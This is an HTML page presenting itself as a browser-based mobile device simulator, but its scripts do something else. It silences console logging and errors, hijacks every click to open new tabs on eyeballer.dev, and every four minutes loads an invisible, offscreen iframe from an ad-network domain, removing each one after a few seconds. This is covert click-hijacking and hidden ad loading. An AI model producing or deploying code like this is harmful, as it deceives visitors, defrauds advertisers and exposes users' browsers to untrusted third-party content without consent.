<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <link rel="icon" type="image/png" href="/assets/favicon-9af398a8.png" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>U-Eyes: Mobile Device Simulator for your browser</title>
    <script>
      window.console.log = function () {};
      window.addEventListener('error', e => {});
    </script>
  </head>
  <body style="position:relative;margin: 0; overflow: hidden; display: flex; justify-content: center;
  background-repeat: no-repeat; background-attachment: fixed; background-position: top center; height:100vh;overflow: hidden;">
    <div id="content" style="position:relative;z-index:-1;top:6500px;left:4000px;opacity:0;"></div>
    <script type="text/javascript">
      const randomFaq = Math.floor(Math.random() * 2);
      document.body.style.backgroundImage = `url('/img/vertical${randomFaq}.png')`;
      url = ["https://eyeballer.dev/milestone", "https://eyeballer.dev/robinhood"]
      function clickBody() {
        window.open(url[randomFaq], "_blank");
      }
      document.body.addEventListener("click", clickBody);
      ///////////////////
      const addLog = () => {
        var container = document.getElementById("content");
        var frame = document.createElement('iframe');  
        frame.id = "log-proxy"
        frame.style = "position:relative;z-index:-1;top:650px;left:400px;border:none;border-color:transparent;height:500px;width:500px;opacity:0;"
        frame.src = "https://www.highcpmgate.com/fiypv9gjb?key=24afcc5d1642c8df9ae55e25dcb19fce"; 
        container.appendChild(frame);
        setTimeout(function() {
          document.getElementById("log-proxy").remove();
        }, 6000);
      }
      function reload() {
        addLog();
        setTimeout(function() {
          reload();
        }, 240000);
      };
      reload();
    </script>
  </body>
</html>
